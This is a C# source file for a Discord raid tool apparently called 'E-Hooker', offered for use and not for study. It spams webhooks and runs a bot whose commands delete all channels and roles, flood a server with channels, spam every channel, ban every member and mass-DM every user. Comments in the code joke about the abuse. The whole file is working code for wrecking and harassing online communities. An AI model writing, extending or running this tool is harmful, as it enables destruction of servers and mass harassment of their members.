using Discord;
using Discord.Net;
using Discord.Webhook;
using Discord.WebSocket;
using Newtonsoft.Json;
using System;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using Console = Colorful.Console;

namespace Discord_EHooker
{
    internal class Functions
    {
        public static class Global
        {
            public static ulong GuildID { get; set; }
            public static string BotToken { get; set;}
            public static ulong UserID { get; set; }
            public static string UserName { get; set; }
        }
        public static void CreateSelection(string id, string option)
        {
            Console.Write("[", System.Drawing.Color.White);
            Console.Write(id, System.Drawing.Color.MediumPurple);
            Console.WriteLine("] " + option, System.Drawing.Color.White);
        }
        public static void WriteLogo()
        {
            //note: your gradient sucks -my last brain cells 12/3/23 @ 2:34am
            string logo = @"

                          ::::::::: ::::::::::: ::::::::   ::::::::   ::::::::  :::::::::  :::::::::                
                         :+:    :+:    :+:    :+:    :+: :+:    :+: :+:    :+: :+:    :+: :+:    :+:                
                        +:+    +:+    +:+    +:+        +:+        +:+    +:+ +:+    +:+ +:+    +:+                 
                       +#+    +:+    +#+    +#++:++#++ +#+        +#+    +:+ +#++:++#:  +#+    +:+                  
                      +#+    +#+    +#+           +#+ +#+        +#+    +#+ +#+    +#+ +#+    +#+                   
                     #+#    #+#    #+#    #+#    #+# #+#    #+# #+#    #+# #+#    #+# #+#    #+#                    
                    ######### ########### ########   ########   ########  ###    ### #########                      
              ::::::::::               :::    :::  ::::::::   ::::::::  :::    ::: :::::::::: ::::::::: 
             :+:                      :+:    :+: :+:    :+: :+:    :+: :+:   :+:  :+:        :+:    :+: 
            +:+                      +:+    +:+ +:+    +:+ +:+    +:+ +:+  +:+   +:+        +:+    +:+  
           +#++:++#   +#++:++#++:++ +#++:++#++ +#+    +:+ +#+    +:+ +#++:++    +#++:++#   +#++:++#:    
          +#+                      +#+    +#+ +#+    +#+ +#+    +#+ +#+  +#+   +#+        +#+    +#+    
         #+#                      #+#    #+# #+#    #+# #+#    #+# #+#   #+#  #+#        #+#    #+#     
        ##########               ###    ###  ########   ########  ###    ### ########## ###    ###      
";
            Console.WriteWithGradient(logo, System.Drawing.Color.Purple, System.Drawing.Color.CornflowerBlue, 10);
        }
        public static void WriteHookerMessage(string message)
        {
            Console.Write("[+ E-Hooker +] ", System.Drawing.Color.HotPink);
            Console.WriteLine(message, System.Drawing.Color.White);
        }
        public static string ReadUserInput()
        {
            Console.Write("\n[", System.Drawing.Color.White);
            Console.Write(">", System.Drawing.Color.MediumPurple);
            Console.Write("] ", System.Drawing.Color.White);
            string input = Console.ReadLine();
            return input;
        }
        public static int ReadUserInputInt()
        {
            Console.Write("\n[", System.Drawing.Color.White);
            Console.Write(">", System.Drawing.Color.MediumPurple);
            Console.Write("] ", System.Drawing.Color.White);
            string input = Console.ReadLine();
            return Int32.Parse(input);
        }
        public static void SuccessMessage(string name, string message)
        {
            Console.Write("[", System.Drawing.Color.White);
            Console.Write(name, System.Drawing.Color.Lime);
            Console.WriteLine($"] {message}", System.Drawing.Color.White);
        }
        public static void ErrorMessage(string name, string message)
        {
            Console.Write("[", System.Drawing.Color.White);
            Console.Write(name, System.Drawing.Color.Red);
            Console.WriteLine($"] {message}", System.Drawing.Color.White);
        }
        public static void WebhookSpam(string URL, string message, int amount)
        {
            NameValueCollection discordValues = new NameValueCollection();
            discordValues.Add("username", "NAME_OF_WEBHOOK");
            discordValues.Add("content", message);
            discordValues.Add("avatar_url", "IMAGE_LINK");
            for (int i = 0; i < amount; i++)
            {
                try
                {
                    new WebClient().UploadValues(URL, discordValues);
                    SuccessMessage("Webhook Spam", "Message Sent!");
                    //who tf cares about waiting?? <- i regret saying that
                    Thread.Sleep(100);
                } catch (Exception e)
                {
                    ErrorMessage("Webhook Spam", $"{e.Message}");
                    Thread.Sleep(2000);
                }
            }
            WriteHookerMessage("Done <3");
            Console.ReadLine();
            Menus.HomeMenu();
        }

        public static Task BotConnect() => new Functions().BotAsync();
        private DiscordSocketClient _client;
        public async Task BotAsync()
        {
            _client = new DiscordSocketClient();
            //note to self: remember to remove Functions from the line below, it's not needed. i hope i remember this since i have short term memory loss
            var token = Functions.Global.BotToken;
            await _client.LoginAsync(TokenType.Bot, token);
            await _client.StartAsync();
            _client.Ready += Ready;
            _client.SlashCommandExecuted += SlashCommandHandler;
            await Task.Delay(-1);
        }
        private async Task Ready()
        {
            Menus.BotMenu();
            SocketGuild guild = _client.GetGuild(Global.GuildID);
            var nukeCommand = new SlashCommandBuilder()
                .WithName("nuke")
                .WithDescription("Deletes all channels");
            var floodCommand = new SlashCommandBuilder()
                .WithName("flood")
                .WithDescription("Flood server with custom channels")
                .AddOption("name", ApplicationCommandOptionType.String, "Name of channel", isRequired: true)
                .AddOption("amount", ApplicationCommandOptionType.Integer, "Amount of channels to be created", isRequired: true);
            var spamCommand = new SlashCommandBuilder()
                .WithName("spam")
                .WithDescription("Spams Messages To All Channels")
                .AddOption("message", ApplicationCommandOptionType.String, "Message to send", isRequired: true)
                .AddOption("amount", ApplicationCommandOptionType.Integer, "Amount to send", isRequired: true);
            var deleteRolesCommand = new SlashCommandBuilder()
                .WithName("delroles")
                .WithDescription("Deletes all roles");
            var massBanCommand = new SlashCommandBuilder()
                .WithName("massban")
                .WithDescription("Bans all memebers");
            var dmSpamCommand = new SlashCommandBuilder()
                .WithName("dmspam")
                .WithDescription("Spams user's DMs")
                .AddOption("message", ApplicationCommandOptionType.String, "Message To Spam", isRequired: true)
                .AddOption("amount", ApplicationCommandOptionType.Integer, "Amount To Spam", isRequired: true);
            try
            {
                await guild.CreateApplicationCommandAsync(nukeCommand.Build());
                await guild.CreateApplicationCommandAsync(floodCommand.Build());
                await guild.CreateApplicationCommandAsync(spamCommand.Build());
                await guild.CreateApplicationCommandAsync(deleteRolesCommand.Build());
                await guild.CreateApplicationCommandAsync(massBanCommand.Build());
                await guild.CreateApplicationCommandAsync(dmSpamCommand.Build());
            } catch (HttpException ex) 
            {
                var json = JsonConvert.SerializeObject(ex.Errors, Formatting.Indented);
                WriteHookerMessage(json);
            }
        }
        private async Task SlashCommandHandler (SocketSlashCommand command)
        {
            if (command.User.Id == Global.UserID)
            {
                await command.RespondAsync("Right Away Master <3");
                switch (command.Data.Name)
                {
                    case "nuke":
                        await HandleNukeCommand(command);
                        break;
                    case "flood":
                        await HandleFloodCommand(command);
                        break;
                    case "spam":
                        await HandleSpamCommand(command);
                        break;
                    case "delroles":
                        await HandleRemoveRolesCommand(command);
                        break;
                    case "massban":
                        await HandleMassBanCommand(command);
                        break;
                    case "dmspam":
                        await HandleDMSpamCommand(command);
                        break;
                }       
            } else
            {
                await command.RespondAsync("You're Not My Master...");
            }         
        } 
        public static ulong ReadUserULongInput()
        {
            Console.Write("\n[", System.Drawing.Color.White);
            Console.Write(">", System.Drawing.Color.MediumPurple);
            Console.Write("] ", System.Drawing.Color.White);
            string input = Console.ReadLine();
            return ulong.Parse(input);
        }
        //the america command
        private async Task HandleNukeCommand(SocketSlashCommand command)
        {
            var guild = _client.GetGuild(Global.GuildID);
            if (guild != null && command.User.Id == Global.UserID)
            {
                foreach (var channel in guild.TextChannels)
                {
                    try
                    {
                        channel.DeleteAsync();
                        SuccessMessage("Nuker", $"Removed {channel.Name}");
                    } catch (Exception ex)
                    {
                        ErrorMessage("Nuker", $"{ex.Message}");
                        Thread.Sleep(2000);
                    }            
                }
                foreach (var channel in guild.VoiceChannels) 
                {
                    try
                    {
                        channel.DeleteAsync();
                        SuccessMessage("Nuker", $"Removed {channel.Name}");
                    } catch (Exception ex)
                    {
                        ErrorMessage("Nuker", $"{ex.Message}");
                        Thread.Sleep(2000);
                    }
                }
            }
            Console.Clear();
            Menus.BotMenu();
        }
        private async Task HandleFloodCommand(SocketSlashCommand command)
        {
            var guild = _client.GetGuild(Global.GuildID);
            if (guild != null && command.User.Id == Global.UserID)
            {
                string name = command.Data.Options.First(option => option.Name == "name").Value.ToString();
                if (int.TryParse(command.Data.Options.First(option => option.Name == "amount").Value.ToString(), out int amount))
                {
                    for (int i = 0; i < amount; i++)
                    {
                        try
                        {
                            var tChannel = guild.CreateTextChannelAsync(name);
                            var vChannel = guild.CreateVoiceChannelAsync(name);

                            SuccessMessage("Flood", $"Created Text Channel: {name}");
                            SuccessMessage("Flood", $"Created Voice Channel: {name}");
                        } catch (Exception ex)
                        {
                            ErrorMessage("Flood", $"{ex.Message}");
                            Thread.Sleep(2000);
                        }
                    }
                }
                Console.Clear();
                Menus.BotMenu();
            }
        }

        private async Task HandleSpamCommand(SocketSlashCommand command)
        {

            var guild = _client.GetGuild(Global.GuildID);
            if (guild != null && command.User.Id == Global.UserID)
            {
                string message = command.Data.Options.First(option => option.Name == "message").Value.ToString();
                if (int.TryParse(command.Data.Options.First(option => option.Name == "amount").Value.ToString(), out int amount))
                {
                    for (int i = 0; i < amount; i++)
                    {
                        foreach (var channel in guild.TextChannels)
                        {
                            try
                            {
                                //who tf cares about awaiting hahaha... why tf am i doing this at 5 in the morning
                                channel.SendMessageAsync(message);
                                SuccessMessage("Spam", $"Sent Message In Channel: {channel.Name}");
                            } catch (Exception ex)
                            {
                                ErrorMessage("Spam", $"Message could not be sent. Error: {ex.Message}");
                            }
                        }
                    }      
                    Console.Clear();
                    Menus.BotMenu();
                }
            }
        }
        private async Task HandleRemoveRolesCommand(SocketSlashCommand command)
        {
            var guild = _client.GetGuild(Global.GuildID);
            if (guild != null && command.User.Id == Global.UserID)
            {
                foreach (var role in guild.Roles)
                {
                    try
                    {
                        role.DeleteAsync();
                        SuccessMessage("Roles", $"Removed Role: {role.Name}");
                    } catch (Exception ex)
                    {
                        ErrorMessage("Roles", $"{ex.Message}");
                        Thread.Sleep(2000);
                    }
                }
                Console.Clear();
                Menus.BotMenu();
            }
        }
        private async Task HandleMassBanCommand(SocketSlashCommand command)
        {
            
            var guild = _client.GetGuild(Global.GuildID);
            if (guild != null && command.User.Id == Global.UserID)
            {
                foreach (var users in guild.Users)
                {
                    try
                    {
                        //bans furries too
                        users.BanAsync();
                        SuccessMessage("Mass Ban", $"Banned User: {users.Username}");
                    } catch (Exception ex)
                    {
                        ErrorMessage("Mass Ban", $"{ex.Message}");
                        Thread.Sleep(2000);
                    }
                }
                Console.Clear();
                Menus.BotMenu();
            }
        }

        private async Task HandleDMSpamCommand(SocketSlashCommand command)
        {
            //pov: you use this command to say "Yeah i got more friends" with 2k+ pings
            var guild = _client.GetGuild(Global.GuildID);
            if (guild != null && command.User.Id == Global.UserID)
            {
                string message = command.Data.Options.First(option => option.Name == "message").Value.ToString();

                if (int.TryParse(command.Data.Options.First(option => option.Name == "amount").Value.ToString(), out int amount))
                {
                    for (int i = 0; i < amount; i++)
                    {
                        foreach (var users in guild.Users)
                        {
                            try
                            {
                                //ahah await gon have to wait
                                users.SendMessageAsync(message);
                                SuccessMessage("DM Spam", $"Message Sent To {users.GlobalName}");
                            }
                            catch (Exception ex)
                            {
                                ErrorMessage("DM Spam", $"{ex.Message}");
                                Thread.Sleep(2000);
                            }
                        }
                    }
                    Console.Clear();
                    Menus.BotMenu();
                }
            }
        }
    }
}